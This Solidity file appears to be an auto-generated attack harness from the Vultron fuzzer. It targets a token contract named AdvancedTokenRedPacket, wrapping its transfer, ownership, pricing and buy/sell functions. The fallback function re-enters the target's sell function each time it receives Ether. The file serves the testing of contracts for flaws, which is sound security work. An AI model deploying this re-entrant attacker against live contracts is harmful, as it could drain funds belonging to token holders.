pragma solidity ^0.4.19;

import "/home/osboxes/Develop/vultron/contracts/AdvancedTokenRedPacket.sol";

contract Attack_AdvancedTokenRedPacket6 {

  AdvancedTokenRedPacket public target_contract;

  function Attack_AdvancedTokenRedPacket6(address _targetContract) public payable {
      target_contract = AdvancedTokenRedPacket(_targetContract);
  } 

  function vultron_approve(address _spender, uint256 _value) public {
    target_contract.approve(_spender, _value);
  } 

  function vultron_burn(uint256 _value) public {
    target_contract.burn(_value);
  } 

  function vultron_burnFrom(address _from, uint256 _value) public {
    target_contract.burnFrom(_from, _value);
  } 

  function vultron_approveAndCall(address _spender, uint256 _value, bytes _extraData) public {
    target_contract.approveAndCall(_spender, _value, _extraData);
  } 

  function vultron_transferOwnership(address newOwner) public {
    target_contract.transferOwnership(newOwner);
  } 

  function vultron_transfer(address _to, uint256 _value) public {
    target_contract.transfer(_to, _value);
  } 

  function vultron_transferFrom(address _from, address _to, uint256 _value) public {
    target_contract.transferFrom(_from, _to, _value);
  } 

  function vultron_freezeAccount(address target, bool freeze) public {
    target_contract.freezeAccount(target, freeze);
  } 

  function vultron_approvedAccount(address target, bool freeze) public {
    target_contract.approvedAccount(target, freeze);
  } 

  function vultron_setPrices(uint256 newSellPrice, uint256 newBuyPrice) public {
    target_contract.setPrices(newSellPrice, newBuyPrice);
  } 

  function vultron_sell(uint256 amount) public {
    target_contract.sell(amount);
  } 

  function vultron_buy(uint256 vultron_amount) public payable{
    target_contract.buy.value(vultron_amount)();
  } 

  function() public payable {
    target_contract.sell(10000);
  }
} 
